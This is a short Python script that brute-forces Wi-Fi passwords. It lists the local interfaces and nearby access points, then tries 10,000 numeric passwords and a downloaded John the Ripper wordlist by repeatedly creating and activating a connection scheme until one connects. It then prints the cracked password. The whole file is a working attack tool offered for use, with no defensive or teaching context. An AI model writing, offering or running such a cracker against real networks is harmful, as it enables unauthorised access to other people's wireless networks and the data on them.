import wifi
import os
import time
import subprocess


def chkroot():
    if os.getuid() != 0:
        print('Root privileges required to run this program. try sudo')
        quit()


def choose(items, item_name):
    print('choose {0}'.format(item_name))
    for i, item in enumerate(items):
        print('  {0}> {1}'.format(i, item))
    return items[int(input('chioce: '))]


def get_interface():
    interfaces = [x.split()[0] for x in
                  subprocess.check_output(['/sbin/ifconfig', '-s']).decode('utf-8').split('\n')[1:] if len(x)]

    return choose(interfaces, 'interface')


def get_cell():
    cells = list(wifi.Cell.all(interface))

    return choose(cells, 'cell')


def gen_passwd():
    passwords = []
    passwords += ['{0:0>10}'.format(i) for i in range(10000)]

    # https://wiki.skullsecurity.org/Passwords http://downloads.skullsecurity.org/passwords/john.txt.bz2
    with open('passwords.txt') as password_cookbook:
        passwords += list(map(lambda x: x.replace('\n', ''), password_cookbook.readlines()))

    return passwords


def hack(interface, cell):
    print('starting dictionary attack...')
    name = int(time.time())
    for password in gen_passwd():
        err = False
        try:
            print('   now trying: {0}'.format(password))
            scheme = wifi.Scheme.for_cell(interface, name, cell, password)
            scheme.delete()
            scheme.save()
            scheme.activate()
        except:
            err = True

        if not err:
            print('cracked! password was: {0}'.format(password))
            quit()


if __name__ == '__main__':
    chkroot()

    interface = get_interface()
    cell = get_cell()

    hack(interface, cell)
